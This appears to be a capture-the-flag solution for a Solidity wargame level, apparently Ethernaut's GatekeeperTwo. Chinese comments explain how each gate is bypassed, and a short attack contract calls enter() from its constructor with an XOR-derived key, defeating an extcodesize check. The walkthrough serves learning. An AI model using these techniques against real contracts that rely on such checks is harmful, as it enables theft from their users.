//gateOne：老方法，还是可以根据部署一个合约调用来通过
//gateTwo：extcodesize 用来获取指定地址的合约代码大小。当caller为合约时，获取的大小为合约字节码大小,caller为账户时，获取的大小为 0 。
//         条件为调用方代码大小为0 ，由于合约在初始化，代码大小为0的。因此，我们需要把攻击合约的调用操作写在 constructor 构造函数中。
//gateThree：这里判断的是msg.sender，所以使用address(this)去计算。异或的特性就是异或两次就是原数据。所以将address(this)和type(uint64).max进行异或的值就是我们想要的值。

contract Attack {

        constructor(address param){
        GatekeeperTwo a =GatekeeperTwo(param);
        bytes8 _gateKey = bytes8(type(uint64).max) ^ bytes8(keccak256(abi.encodePacked(address(this))));
        a.enter(_gateKey);
    }
    
}
